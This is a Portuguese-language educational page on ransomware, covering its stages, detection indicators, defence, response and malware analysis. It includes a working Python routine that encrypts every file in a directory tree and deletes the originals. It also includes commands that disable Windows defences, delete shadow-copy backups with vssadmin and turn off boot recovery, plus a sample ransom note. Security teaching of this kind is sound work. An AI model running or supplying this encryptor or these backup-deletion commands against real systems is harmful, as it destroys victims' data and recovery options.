# Ransomware — Código Exemplo e Análise

⚠️ **AVISO LEGAL**: Código exclusivamente para fins educacionais. NUNCA use maliciosamente.

---

## O Que é Ransomware?

**Ransomware** é malware que criptografa dados e exige resgate.

### Componentes

1. **Delivery**: Como chega ao alvo (email, exploit)
2. **Execution**: Como executa
3. **Encryption**: Criptografa arquivos
4. **Payment**: Exige resgate
5. **Recovery**: Supostamente descriptografa

---

## Código Educacional Simples (NÃO USE!)

### Python — Conceito de Criptografia

```python
#!/usr/bin/env python3
"""
EDUCACIONAL APENAS
Demonstração de conceito de criptografia em ransomware
"""

import os
from cryptography.fernet import Fernet

def encrypt_file(filename, cipher):
    """Criptografa arquivo individual"""
    try:
        with open(filename, 'rb') as f:
            plaintext = f.read()
        
        ciphertext = cipher.encrypt(plaintext)
        
        with open(filename + '.encrypted', 'wb') as f:
            f.write(ciphertext)
        
        os.remove(filename)  # Remover original
        print(f"[+] Criptografado: {filename}")
    
    except Exception as e:
        print(f"[-] Erro: {e}")

def encrypt_directory(directory, cipher):
    """Criptografa todos os arquivos"""
    for root, dirs, files in os.walk(directory):
        for file in files:
            if not file.endswith('.encrypted'):
                filepath = os.path.join(root, file)
                encrypt_file(filepath, cipher)

# GERAR CHAVE (NUNCA COMPARTILHAR)
key = Fernet.generate_key()
print(f"[!] CHAVE: {key.decode()}")
cipher = Fernet(key)

# EXEMPLO: Criptografar /tmp/test (EVITAR)
# encrypt_directory('/tmp/test', cipher)

print("[!] CÓDIGO NÃO EXECUTADO POR SEGURANÇA")
```

---

## Como Ransomware Funciona

### 1. Delivery

```
Arquivo: email.zip
Contém: ransomware.exe
Método: Phishing
```

### 2. Execução

```powershell
ransomware.exe

# Desabilitar defesas
cmd /c powershell -NoProfile -ExecutionPolicy Bypass -Command "Disable-WindowsDefenderATP"

# Deletar backups
vssadmin delete shadows /all /quiet

# Desabilitar recuperação
bcdedit /set {default} recoveryenabled No
```

### 3. Criptografia

```python
# Procura por arquivo tipos
EXTENSÕES = ['.doc', '.xls', '.pdf', '.jpg', '.txt', ...]

# Criptografa com chave gerada localmente
# Chave é enviada para servidor C&C
```

### 4. Nota de Resgate

```
Seus arquivos foram criptografados!

Seu ID: ABC123XYZ
Resgate: 0.5 BTC ($20,000)

Contato: ransomware@dark.onion

Você tem 72 horas.
Depois o preço dobra.
```

### 5. Pagamento

```
Bitcoins para: 1A1z7agoat2BWt8V2...

Após pagamento:
- Fornecida chave de descriptografia
- Decryptor.exe
- Promessa de NÃO manter backups
```

---

## Indicadores de Compromisso (IoC)

### Detectar Ransomware

```
☐ Arquivo .encrypted em massa
☐ Nota de resgate (README.txt)
☐ Extensão desconhecida nos arquivos
☐ Processo C2 suspeito (conexão saindo)
☐ Vssadmin/wmic deletando backups
☐ PowerShell desabilitado
☐ Processos de criptografia intensivos
☐ Atividade de rede anormal
```

### Monitorar

```bash
# Verificar extensão de arquivo
find / -name "*.encrypted" -o -name "*.locked" -o -name "*.crypt"

# Procurar nota de resgate
find / -name "README*" -o -name "DECRYPT*"

# Verificar processos
ps aux | grep -i crypt

# Conexões de rede
netstat -an | grep ESTABLISHED
```

---

## Defesa

### Prevenção

```
✅ Backups regulares (offline!)
✅ Não executar arquivos desconhecidos
✅ Manter antivírus/EDR atualizado
✅ Patch management
✅ Segmentação de rede
✅ Filtro de email
✅ User education
✅ Disable PowerShell (se possível)
```

### Resposta

```
☐ Isolar máquina da rede
☐ Coletar evidência
☐ NÃO pagar resgate
☐ Contatar autoridades
☐ Restaurar de backup
☐ Investigar causa raiz
```

---

## Análise de Malware

### Estaticamente

```bash
# Verificar assinatura
file ransomware.exe

# Strings
strings ransomware.exe | grep -i "bitcoin\|email\|ransom"

# VirusTotal
curl -F "file=@ransomware.exe" "https://www.virustotal.com/api/v3/files"
```

### Dinamicamente

```bash
# Em VM isolada
# Executar malware e monitorar:
- Arquivos criados/modificados
- Processos spawned
- Conexões de rede
- Registry changes (Windows)

# Ferramentas:
- Wireshark (rede)
- Process Monitor (Windows)
- strace (Linux)
```

---

## Famílias Conhecidas

```
WannaCry (2017)
Notpetya (2017)
Locky (2016-2019)
CryptoLocker (2013)
Ryuk (2019-presente)
DarkSide (2020-2021)
LockBit (2021-presente)
BlackCat (2022-presente)
```

---

## Relatório de Análise

```
1. Informações Básicas
   - Tipo: Ransomware
   - Família: XYZ
   - CVE: CVE-2021-XXXXX
   - Severidade: CRÍTICO

2. Indicadores
   - Hash MD5: ...
   - Hash SHA256: ...
   - File size: ...

3. Comportamento
   - Criptografia: AES-256
   - Targets: Documentos, fotos
   - C2: ransomware.com:443

4. Impacto
   - Perda de dados
   - Parada de negócio
   - Dano à reputação

5. Mitigação
   - Restaurar de backup
   - Investigar acesso inicial
   - Patch de vulnerabilidade
   - Implementar defesa

6. Referências
   - VirusTotal
   - MITRE ATT&CK
   - Blog de segurança
```

---

## Recursos Educacionais

```
- MITRE ATT&CK Framework
- OWASP Top 10
- CIS Critical Controls
- NIST Cybersecurity Framework
```

---

**Lembre-se**: Conhecimento pode ser usado para proteger ou atacar. Escolha proteger.

---

Próximo: `analise-risco.md` - Avaliação de risco de ransomware
